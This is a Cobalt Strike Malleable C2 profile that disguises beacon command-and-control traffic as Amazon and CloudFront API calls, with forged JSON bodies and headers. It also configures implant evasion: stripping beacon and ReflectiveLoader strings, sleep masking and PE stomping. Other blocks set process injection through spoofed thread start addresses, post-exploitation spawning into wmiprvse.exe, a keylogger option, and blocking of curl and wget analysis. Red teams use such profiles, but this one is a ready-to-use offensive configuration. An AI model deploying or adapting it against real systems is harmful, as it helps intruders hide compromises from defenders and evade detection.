#amazon_events profile
#Created by xx0hcd
#Modified by Kleiton Kurti (@kleiton0x7e) & John Stigerwalt (@jstigerwalt1)

###Global Options###
set sample_name "amazon_events_modified.profile";

set sleeptime "18500";
set jitter    "35";
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set data_jitter "50";

set host_stage "false";

set create_remote_thread "true"; # Allow beacon to create threads in other processes
set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspeneded process

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH BANNER###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###Steal Token
set steal_token_access_mask "11";

###Proxy Options
set tasks_max_size "3604500";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

###SSL Options###
#https-certificate {
#    set keystore "domain001.store";
#    set password "password123";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/broadcast";
    
    client {

        #header "Host" "d23tl967axkois.cloudfront.net";
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Origin" "https://www.amazon.com";
        header "Referer" "https://www.amazon.com";
        header "Sec-Fetch-Dest" "empty";
        header "Sec-Fetch-Mode" "cors";
        header "Sec-Fetch-Site" "cross-site";
        header "Te" "trailers";

	   
    metadata {
        base64;
	
        header "x-amzn-RequestId";

    }

    }

    server {
    
        header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Allow-Methods" "GET";
        header "Access-Control-Allow-Credentials" "true";
        header "X-Amz-Version-Id" "null";
        header "Server" "AmazonS3";
        header "X-Cache" "Hit from cloudfront";
 
        output {

            base64;
            
            prepend "
{\"broadcastEventsData\":{
  \"54857e6d-c060-4b3c-914a-87adfcde093e\":{
  \"lcid\":null,
  \"chatStatus\":\"DISABLED\",
  \"isChatEnabled\":false,
  \"isCarouselEnabled\":null,
  \"highlightedSegmentItemId\":\"";
            
            append "\"";
            append "
  },
  \"B07YF1TNL7\":{
    \"promotions\":null,
    \"percentClaimed\":0,
    \"primeAccessType\":null,
    \"endDate\":\"1970-01-01T00:00:00Z\",
    \"primeBenefitSaving\":null,
    \"dealId\":\"2b2f3426\",
    \"percentOff\":15,
    \"state\":\"\",
    \"dealPrice\":{
      \"fractionalValue\":20,
      \"currencySymbol\":\"$\",
      \"wholeValue\":89
    },
    \"dealType\":\"BEST_DEAL\",
    \"listPrice\":{
      \"fractionalValue\":99,
      \"currencySymbol\":\"$\",
      \"wholeValue\":104
      },
      \"primeExclusive\":false
    },
    \"B071CQCBBN\":{
      \"promotions\":null,
      \"percentClaimed\":0,
      \"primeAccessType\":null,
      \"endDate\":\"1970-01-01T00:00:00Z\",
      \"primeBenefitSaving\":null,
      \"dealId\":\"09a7bbc8\",
      \"percentOff\":15,
      \"state\":\"\",
      \"dealPrice\":{
        \"fractionalValue\":99,
        \"currencySymbol\":\"$\",
        \"wholeValue\":84
      },
      \"dealType\":\"BEST_DEAL\",
      \"listPrice\":{
        \"fractionalValue\":99,
        \"currencySymbol\":\"$\",
        \"wholeValue\":99
      },
      \"primeExclusive\":false
    }
  },
  \"throttled\":false
 },
 \"isLiveBadgeEnabled\":null,
 \"liveViewers\":-1,
 \"interactiveEvents\":[
 ],
 \"vods\":null,
 \"hlsUrl\":
 \"https://d22u79neyj432a.cloudfront.net/bfc50dfa-8e10-44b5-ae59-ac26bfc71489/54857e6d-c060-4b3c-914a-87adfcde093e.m3u8\"
  }
 },
 \"version\":\"1.0\"
}";
	  

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/1/events/com.amazon.csm.csa.prod";
    #set verb "GET";
    set verb "POST";

    client {

	#header "Host" "unagi.amazon.com";
	header "Accept" "*/*";
	#header "Accept-Language" "en-US,en;q=0.5";
	#header "Content-Type" "text/plain;charset=UTF-8";
	header "Origin" "https://www.amazon.com";
        
        output {
            base64url;
            
            prepend "{\"events\":[{\"data\":{\"schemaId\":\"csa.VideoInteractions.1\",\"application\":\"Retail:Prod:,\"requestId\":\"MBFV82TTQV2JNBKJJ50B\",\"title\":\"Amazon.com. Spend less. Smile more.\",\"subPageType\":\"desktop\",\"session\":{\"id\":\"133-9905055-2677266\"},\"video\":{\"id\":\"";

            append "\"\n";
            append "\"playerMode\":\"INLINE\",\"videoRequestId\":\"MBFV82TTQV2JNBKJJ50B\",\"isAudioOn\":\"false\",\"player\":\"IVS\",\"event\":\"NONE\"}}}}]}";

	    
	    print;
	    
        }

        id {
	    base64url;
            #parameter "id";
            header "x-amz-rid";

        }
    }

    server {
    
        header "Server" "Server";
        header "Content-Type" "application/json";
        header "Connection" "close";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Expose-Headers" "x-amzn-RequestId,x-amzn-ErrorType,x-amzn-ErrorMessage,Date";
        header "Access-Control-Allow-Credentials" "true";
        header "Vary" "Origin,Content-Type,Accept-Encoding,X-Amzn-CDN-Cache,X-Amzn-AX-Treatment,User-Agent";
        header "Permissions-Policy" "interest-cohort=()";

        output {
            netbios;	    
	   
	    prepend "\n";
	    prepend "{";
	    
	    append "\n";
	    append "}";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {
	set uri_x86 "/1/Events/com.amazon.csm.csa.prod";
	set uri_x64 "/2/events/com.amazon.csm.csa.prod";
    
    client {

        #header "Host" "unagi.amazon.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";
    }
    
    server {
    
    	header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Allow-Methods" "GET";
        header "Access-Control-Allow-Credentials" "true";
        header "X-Amz-Version-Id" "null";
        header "Server" "AmazonS3";
        header "X-Cache" "Hit from cloudfront";
    
    	output {
    	
    		print;
    	}
    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "5 May 2023 10:52:15";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    set name	        "srv.dll";
    set magic_mz_x64    "OOPS";
    set magic_mz_x86    "OOPS";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header    "\x71\xd5\xdf\x19\x38\x77\xab\x8d\x2b\x41\x5e\xcb\x98\x22\x05\x90";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #set allocator "HeapAlloc";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        }

    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        strrep "Stack around the variable" "";
        strrep "was corrupted." "";
        strrep "The variable" "";
        strrep "is being used without being initialized." "";
        strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
        strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
        strrep "Stack memory was corrupted" "";
        strrep "A local variable was used before it was initialized" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around" "corrupted";
        strrep "operator" "";
        strrep "operator co_await" "";
        strrep "operator<=>" "";
        }
}

###Process Inject Block###
process-inject {
    set allocator "NtMapViewOfSection";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "16700";
    set userwx "false";  
    set startrwx "false";
        
    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }
    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        SetThreadContext;
        NtQueueApcThread-s;
        #NtQueueApcThread;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}
